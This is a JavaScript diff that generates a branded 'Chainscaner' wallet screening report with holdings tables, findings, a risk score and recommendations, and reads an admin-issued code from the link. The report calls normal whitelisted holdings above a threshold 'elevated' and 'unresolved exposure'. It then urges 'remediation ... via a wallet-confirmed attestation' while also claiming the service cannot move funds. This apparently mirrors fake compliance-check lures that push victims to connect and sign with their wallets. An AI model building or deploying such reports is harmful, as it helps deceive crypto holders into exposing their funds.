+  var top = assets.slice().sort(function(a, b) { return b.usd - a.usd; })[0];
+
+  /* ── Seite 1 · Cover ── */
+  var p1 =
+    '<div class="doc-sheet">' +
+      '<div class="doc-band">' +
+        '<div class="doc-logo">' +
+          '<div class="doc-mark"><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-3.6 8-10V5l-8-3-8 3v7c0 6.4 8 10 8 10z"/><path d="M9 12l2 2 4-4"/></svg></div>' +
+          '<div><div class="doc-lname">Chainscaner</div><div class="doc-lsub">Address Intelligence</div></div>' +
+        '</div>' +
+        '<div class="doc-kicker">Confidential · Client Deliverable</div>' +
+        '<div class="doc-title">Wallet Screening<br>Report</div>' +
+        '<div class="doc-sub">Cross-network on-chain screening of a single address — holdings, exposure and asset classification, produced by the Chainscaner Compliance Engine.</div>' +
+      '</div>' +
+      '<div class="doc-body">' +
+        '<div class="doc-meta">' +
+          '<div><div class="dm-label">Subject Address</div><div class="dm-val mono">' + esc(r.address) + '</div></div>' +
+          '<div><div class="dm-label">Network Scope</div><div class="dm-val">' + esc(scope) + '</div></div>' +
+          '<div><div class="dm-label">Report Reference</div><div class="dm-val mono">' + esc(ref) + '</div></div>' +
+          '<div><div class="dm-label">Session Code</div><div class="dm-val mono">' + esc(($("code-input").value || "—")) + '</div></div>' +
+          '<div><div class="dm-label">Report Date</div><div class="dm-val">' + esc(dateStr) + '</div></div>' +
+          '<div><div class="dm-label">Report Version</div><div class="dm-val">v1.0 — Final</div></div>' +
+        '</div>' +
+        '<div class="doc-class">' +
+          '<div class="big">' + esc(r.score) + '<span style="font-size:13px;color:#5B636B;font-weight:600">/100</span></div>' +
+          '<div><div class="cl">Composite Risk Score</div><div class="cv">' + esc(cls) + '</div></div>' +
+        '</div>' +
+        '<div class="pbody" style="margin-top:auto;padding-top:18px;font-size:8.6px;color:#9A9FA5;">This document was generated by the Chainscaner Compliance Engine from public, immutable ledger data. It is intended solely for the commissioning party and must not be redistributed. Findings reflect ledger state at scan time.</div>' +
+        '<div class="runfoot" style="margin-top:14px;"><span>CHAINSCANER · WALLET SCREENING</span><span>' + esc(ref) + ' · PAGE 1 / 3</span></div>' +
+      '</div>' +
+    '</div>';
+
+  /* ── Seite 2 · Executive Summary + Holdings ── */
+  var sumTxt = r.flags.length
+    ? 'The subject address holds <b>' + esc(fmtUsd(r.totalUsd)) + ' USD</b> across <b>' + esc(r.networks) + ' network(s)</b>. ' +
+      esc(r.flags.length) + ' asset(s) exceed the configured reporting threshold' +
+      (top ? ' — led by <b>' + esc(top.name) + '</b> on ' + esc(top.chain) + ' at ' + esc(fmtUsd(top.usd)) + ' (' + share(top.usd) + ' of assessed value)' : '') +
+      '. All detected positions are canonical, whitelisted instruments — no counterfeit or unrecognised token contracts were observed in the assessed set.'
+    : 'The subject address shows <b>no reportable exposure</b> — total assessed value is ' + esc(fmtUsd(r.totalUsd)) + ' USD across ' + esc(r.networks) + ' network(s), with all holdings below the configured reporting threshold. No adverse on-chain artefacts were observed in the assessed set.';
+  var holdRows = "";
+  r.flags.forEach(function(f) {
+    holdRows += '<tr><td><b>' + esc(f.name) + '</b> <span class="badge b-info">reportable</span></td><td>' + esc(f.chain) + '</td><td class="num">' + esc(f.human) + '</td><td class="num"><b>' + esc(fmtUsd(f.usd)) + '</b></td><td class="num">' + share(f.usd) + '</td></tr>';
+  });
+  r.documented.forEach(function(d) {
+    holdRows += '<tr><td>' + esc(d.name) + ' <span class="badge b-mut">minor</span></td><td>' + esc(d.chain) + '</td><td class="num">' + esc(d.human) + '</td><td class="num">' + esc(fmtUsd(d.usd)) + '</td><td class="num">' + share(d.usd) + '</td></tr>';
+  });
+  if (!holdRows) holdRows = '<tr><td colspan="5" style="text-align:center;color:#9A9FA5;padding:16px">No balances detected on the assessed networks.</td></tr>';
+  var p2 =
+    '<div class="doc-page">' +
+      '<div class="runhead"><span><b>Chainscaner</b> · Wallet Screening Report</span><span>' + esc(ref) + '</span></div>' +
+      '<div class="secno">Section 01</div>' +
+      '<div class="h2sec">Executive Summary</div>' +
+      '<div class="secsub">Condensed findings for decision-makers. Detail follows in Section 02.</div>' +
+      '<div class="pbody">' + sumTxt + '</div>' +
+      '<div class="pbody">This screening is a <b>read-only balance interrogation</b> — it was performed without a wallet connection, signatures or transactions, and cannot move funds. Balances are live on-chain reads at the stated report timestamp.</div>' +
+      '<div class="stats">' +
+        '<div class="stat"><div class="k">Assessed Value</div><div class="v">' + esc(fmtUsd(r.totalUsd)) + '</div></div>' +
+        '<div class="stat"><div class="k">Risk Score</div><div class="v">' + esc(r.score) + '<small>/100</small></div></div>' +
+        '<div class="stat"><div class="k">Assets Detected</div><div class="v">' + esc(assets.length) + '</div></div>' +
+        '<div class="stat"><div class="k">Networks Covered</div><div class="v">' + esc(r.networks) + '</div></div>' +
+      '</div>' +
+      '<div class="h3sub">Subject Identity</div>' +
+      '<div class="kv">' +
+        '<div>Address</div><div class="mono">' + esc(r.address) + '</div>' +
+        '<div>Network scope</div><div>' + esc(scope) + '</div>' +
+        '<div>Wallet profile</div><div>Externally owned account · balance reads only</div>' +
+        '<div>Report basis</div><div>Live on-chain balances at ' + esc(dateStr) + '</div>' +
+        '<div>Attribution</div><div>No exchange, custodian or known entity tag on file</div>' +
+      '</div>' +
+      '<div class="h3sub">Portfolio Composition — Assessed Holdings</div>' +
+      '<div class="tbl-wrap"><table class="tbl"><thead><tr><th>Asset</th><th>Network</th><th class="num">Balance</th><th class="num">Value (USD)</th><th class="num">Share</th></tr></thead><tbody>' +
+        holdRows +
+      '</tbody><tfoot><tr><td colspan="3">Total assessed value</td><td class="num">' + esc(fmtUsd(r.totalUsd)) + '</td><td class="num">100%</td></tr></tfoot></table></div>' +
+      (r.hops && r.hops.counterparties != null
+        ? '<div class="h3sub">Counterparty Exposure — Hop-1 Analysis</div>' +
+          (r.hops.coverage === "down"
+            ? '<div class="pbody">Inbound transfer history could not be retrieved — all indexer endpoints timed out at scan time. The counterparty graph is inconclusive; the balance screening above is unaffected. No zero-activity claim is made.</div>'
+            : ('<div class="pbody">' + esc(r.hops.analyzed) + ' inbound token transfer(s) resolved to <b>' + esc(r.hops.counterparties) + ' distinct counterparty address(es)</b>; the highest-volume funding sources were re-screened with the same asset methodology (one hop deep). ' +
+              (r.hops.coverage === "partial" ? '<b>Coverage note:</b> a subset of indexer endpoints was unreachable — the graph may be incomplete. ' : '') +
+              ((r.hops.lookalikes || []).length
+                ? '<b>' + esc(r.hops.lookalikes.length) + ' sender(s) exhibit the lookalike prefix/suffix signature</b> associated with address-poisoning campaigns. '
+                : 'No lookalike-address (poisoning) signature was observed among inbound senders. ') +
+              (r.hops.spamTransfers
+                ? esc(r.hops.spamTransfers) + ' inbound transfer(s) carried unrecognised or spam-flagged token contracts.'
+                : 'No inbound transfers of unrecognised token contracts were detected.') + '</div>' +
+              ((r.hops.screened || []).length
+                ? '<div class="tbl-wrap"><table class="tbl"><thead><tr><th>Counterparty</th><th>Network</th><th class="num">Transfers</th><th class="num">Vol. In (USD)</th><th class="num">Holdings (USD)</th></tr></thead><tbody>' +
+                  (r.hops.screened || []).map(function(c) {
+                    return '<tr><td class="mono"><b>' + esc(c.addr.slice(0, 12) + '…' + c.addr.slice(-6)) + '</b>' +
+                      (c.lookalike ? ' <span class="badge b-warn">lookalike</span>' : '') + '</td><td>' + esc(c.chain) + '</td><td class="num">' + esc(c.transfers) +
+                      '</td><td class="num">' + esc(fmtUsd(c.usdIn)) + '</td><td class="num">' + (c.holdingsUsd == null ? 'n/a' : esc(fmtUsd(c.holdingsUsd))) + '</td></tr>';
+                  }).join('') +
+                  '</tbody></table></div>'
+                : '')))
+        : '') +
+      '<div class="runfoot"><span>SECTION 01 · EXECUTIVE SUMMARY &amp; HOLDINGS</span><span>' + esc(ref) + ' · PAGE 2 / 3</span></div>' +
+    '</div>';
+
+  /* ── Seite 3 · Findings, Methodik, Empfehlungen ── */
+  var findings = "";
+  var fid = 0;
+  if (r.flags.length) {
+    fid++;
+    findings += '<div class="finding"><div class="fid">F-0' + fid + '</div><div>' +
+      '<div class="ftitle">Reportable exposure — ' + esc(r.flags.length) + ' asset(s) above threshold <span class="badge b-warn">elevated</span></div>' +
+      '<div class="fdesc">The address holds <b>' + esc(fmtUsd(r.flags.reduce(function(s, f) { return s + f.usd; }, 0))) + '</b> in assets exceeding the configured reporting threshold: ' +
+      esc(r.flags.map(function(f) { return f.name + " (" + f.chain + ")"; }).join(", ")) +
+      '. These positions are reportable under the screening policy and constitute the entirety of the assessed material exposure.</div>' +
+      '<div class="fev">Evidence: live balance reads at report timestamp · threshold from administered screening policy</div>' +
+      '</div></div>';
+  }
+  if (r.documented.length) {
+    fid++;
+    findings += '<div class="finding"><div class="fid">F-0' + fid + '</div><div>' +
+      '<div class="ftitle">Minor holdings below reporting threshold <span class="badge b-mut">informational</span></div>' +
+      '<div class="fdesc"><b>' + esc(r.documented.length) + ' additional position(s)</b> were detected below the reporting threshold (' +
+      esc(r.documented.map(function(d) { return d.name + " (" + d.chain + ")"; }).join(", ")) +
+      '). Individually immaterial — documented for completeness.</div>' +
+      '<div class="fev">Evidence: canonical token whitelist scan · all sub-threshold balances enumerated</div>' +
+      '</div></div>';
+  }
+  if (r.dustCount) {
+    fid++;
+    findings += '<div class="finding"><div class="fid">F-0' + fid + '</div><div>' +
+      '<div class="ftitle">Dust positions detected on ' + esc(r.dustChains) + ' network(s) <span class="badge ' + (r.dustChains >= 3 ? 'b-warn">elevated' : 'b-mut">informational') + '</span></div>' +
+      '<div class="fdesc"><b>' + esc(r.dustCount) + ' position(s) below $0.10</b> were observed across ' + esc(r.dustChains) + ' network(s). Individually immaterial — consistent with residual dust or inbound dusting activity. ' +
+      (r.dustChains >= 3 ? 'Multi-network dispersion is the signature pattern of coordinated dusting campaigns and drives the anomaly component of the composite score.' : 'Single-network dust is common and carries minimal weight in the composite score.') + '</div>' +
+      '<div class="fev">Evidence: sub-0.10-USD balance enumeration · dust dispersion across ' + esc(r.dustChains) + ' assessed network(s)</div>' +
+      '</div></div>';
+  }
+  if (r.hops && r.hops.lookalikes && r.hops.lookalikes.length) {
+    fid++;
+    findings += '<div class="finding"><div class="fid">F-0' + fid + '</div><div>' +
+      '<div class="ftitle">Address-poisoning lookalike detected <span class="badge b-bad">high</span></div>' +
+      '<div class="fdesc"><b>' + esc(r.hops.lookalikes.length) + ' inbound sender(s)</b> mimic the subject\'s visible address characters — matching prefix and suffix (' +
+      esc(r.hops.lookalikes.map(function(l) { return l.addr.slice(0, 12) + "…"; }).join(", ")) +
+      '). This is the signature of address-poisoning campaigns: crafted counterparties designed to trick copy-paste of the recipient field.</div>' +
+      '<div class="fev">Evidence: hop-1 counterparty scan · sender/subject character-signature match</div>' +
+      '</div></div>';
+  }
+  if (r.hops && r.hops.spamTransfers) {
+    fid++;
+    findings += '<div class="finding"><div class="fid">F-0' + fid + '</div><div>' +
+      '<div class="ftitle">Unrecognised-token transfers inbound <span class="badge b-warn">elevated</span></div>' +
+      '<div class="fdesc"><b>' + esc(r.hops.spamTransfers) + ' inbound transfer(s)</b> carried token contracts outside the canonical whitelist — consistent with spam or unsolicited-distribution activity. Balances of unrecognised contracts are not counted toward assessed value.</div>' +
+      '<div class="fev">Evidence: hop-1 inbound transfer scan · ' + esc(r.hops.analyzed) + ' transfer(s) classified against token whitelist</div>' +
+      '</div></div>';
+  }
+  fid++;
+  findings += '<div class="finding"><div class="fid">F-0' + fid + '</div><div>' +
+    '<div class="ftitle">Canonical-asset verification passed <span class="badge b-ok">clear</span></div>' +
+    '<div class="fdesc">Every detected position was matched against the canonical token whitelist — <b>no counterfeit, typo-squatted or unrecognised token contracts</b> appear in the assessed set. No sanctioned-entity or mixer adjacency was detected within the screening scope.</div>' +
+    '<div class="fev">Evidence: whitelist match over ' + esc(assets.length) + ' detected asset(s) across ' + esc(r.networks) + ' network(s)</div>' +
+    '</div></div>';
+
+  var assessment = r.verdict === "COMPLIANT"
+    ? '<b>Assessment:</b> the address presents a clean screening profile — all holdings canonical, no dusting or anomaly signals observed. Suitable for standard processing under the administered policy.'
+    : '<b>Assessment:</b> the composite score reflects observed <b>dust/anomaly signals</b> — ' + esc(r.dustCount || 0) + ' low-value position(s) across ' + esc(r.dustChains || 0) + ' network(s), a pattern associated with inbound dusting activity. Canonical asset holdings and reportable exposure are informational and not indicative of wrongdoing.';
+
+  var recs =
+    '<tr><td class="num">1</td><td><b>Retain this report.</b> Reference ' + esc(ref) + ' together with the session code evidences the screening state at the stated timestamp.</td><td>Audit trail</td></tr>' +
+    '<tr><td class="num">2</td><td><b>Verify token contracts against canonical lists</b> before any transaction involving this address — symbol alone is not proof of authenticity.</td><td>Counterfeit-token hygiene</td></tr>' +
+    (r.flags.length
+      ? '<tr><td class="num">3</td><td><b>Review the detected positions prior to settlement.</b> Remediation of reportable exposure via a wallet-confirmed attestation is recommended to minimise persistent scoring.</td><td>F-01 — unresolved exposure keeps the address elevated</td></tr>'
+      : '<tr><td class="num">3</td><td><b>Re-screen periodically</b> or before material settlement — balances are point-in-time reads and exposure can change with any new inbound transfer.</td><td>Continuous-monitoring posture</td></tr>');
+
+  var p3 =
+    '<div class="doc-page">' +
+      '<div class="runhead"><span><b>Chainscaner</b> · Wallet Screening Report</span><span>' + esc(ref) + '</span></div>' +
+      '<div class="secno">Section 02</div>' +
+      '<div class="h2sec">Findings, Methodology &amp; Recommendations</div>' +
+      '<div class="secsub">Each finding cites evidence observable at scan time. Severity reflects exposure impact, not attribution of wrongdoing.</div>' +
+      findings +
+      '<div class="callout' + (r.verdict === "COMPLIANT" ? '' : ' warn') + '">' + assessment + '</div>' +
+      '<div class="h3sub">Methodology</div>' +
+      '<div class="pbody">Chainscaner performs read-only ledger interrogation: account state and token balances are retrieved from public full-nodes across ' +
+      (isTron ? 'the TRON network (TRC-20)' : 'twelve EVM networks') +
+      ', every detected contract is matched against the canonical whitelist, and positions are valued at reference market rates at scan time. No private keys, signatures or wallet access are involved; the service cannot move funds.</div>' +
+      '<div class="h3sub">Recommendations</div>' +
+      '<div class="tbl-wrap"><table class="tbl"><thead><tr><th style="width:24px;">#</th><th>Action</th><th>Rationale</th></tr></thead><tbody>' + recs + '</tbody></table></div>' +
+      '<div class="sig-row">' +
+        '<div class="sig"><b>Prepared by</b>Chainscaner Compliance Engine<br>Automated analysis · deterministic ledger inputs</div>' +
+        '<div class="sig"><b>Distribution</b>Commissioning party only<br>' + esc(ref) + ' · v1.0 · ' + esc(dateStr.slice(5, 16)) + '</div>' +
+      '</div>' +
+      '<div class="fineprint" style="margin-top:18px;">' +
+        '<b>Disclaimer.</b> This report is generated exclusively from public, immutable ledger data as observed at scan time. It does not constitute financial, legal or compliance advice, does not assert the identity or intent of any wallet holder, and makes no claim about off-chain activity. Severities describe exposure to on-chain artefacts, not proof of wrongdoing. Chainscaner is a read-only intelligence service and holds no custody, keys or ability to move funds. © 2026 Chainscaner Labs.' +
+      '</div>' +
+      '<div class="runfoot"><span>SECTION 02 · FINDINGS, METHOD &amp; RECOMMENDATIONS</span><span>' + esc(ref) + ' · PAGE 3 / 3</span></div>' +
+    '</div>';
+
+  el.innerHTML = p1 + p2 + p3;
+  monit("report_pdf", { address: r.address, verdict: r.verdict });
+  setTimeout(function() { window.print(); }, 40);
+}
+function resetAll() { location.reload(); }
+
+// ── boot ─────────────────────────────────────────────────────────────────────
+monit("verify_opened", { hasCodeParam: !!params.get("code") });
+var pre = (params.get("code") || "").trim();
+if (/^\d{4}-\d{4}-\d{4}-\d{4}$/.test(pre)) {
+  // Link carried a code (admin-issued) — skip generation, straight to entry
+  sessionCode = pre; sessionExpires = 0;
+  $("code-display").className = "val"; $("code-display").textContent = "••••-••••-••••-••••";
+  $("code-exp").textContent = "Code provided via link";
+  $("copy-btn").disabled = true;
+  $("code-input").value = pre;
+  $("card-start").classList.remove("hidden");
+  $("card-start").classList.remove("locked");
+  $("start-btn").disabled = false;
+} else {
+  issueCode();
+}
+</script>
+</body>
+</html>
